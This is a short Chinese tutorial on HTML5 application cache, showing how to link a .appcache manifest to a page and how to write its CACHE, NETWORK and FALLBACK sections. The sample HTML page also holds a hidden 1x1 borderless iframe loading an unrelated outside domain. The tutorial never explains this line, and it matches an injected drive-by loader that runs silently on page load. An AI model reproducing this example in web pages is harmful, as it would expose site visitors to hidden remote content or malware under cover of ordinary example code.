# Cache

HTML5中我们可以轻松的构建一个离线（无网络状态）应用，只需要创建一个**cache manifest**文件

## 1. create and link cache file to html page

一个普通文本文件，其中列出了浏览器应缓存以供离线访问的资源，推荐使用.appcache为后缀名，添加MIME类型.

例如我们创建了一个名为demo.appcache的文件，然后在需要应用缓存在页面的根元素(html)添加属性manifest="demo.appcache"，路径要保证正确

```html
<!DOCTYPE html>
<html manifest="demo.appcache">
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
</head>
<body>
<img src="http://i.itcast.cn/Upload/Images/20160725/57958ab0321ed.jpg" alt=""/>
<iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
</body>
</html>
```

## 2. manifest文件格式

1. 顶行写CACHE MANIFEST
2. CACHE: 换行 指定我们需要缓存的静态资源, 如.css, image, js等
3. NETWORK: 换行 指定需要在线访问的资源, 可使用通配符
4. FALLBACK: 换行 当被缓存的文件找不到时的备用资源

example manifest file:

```manifest
CACHE MANIFEST

#要缓存的文件
CACHE:
    images/img1.jpg
    images/img2.jpg


#指定必须联网才能访问的文件
NETWORK:
     images/img3.jpg
     images/img4.jpg


#当前页面无法访问是回退的页面
FALLBACK:
    404.html

```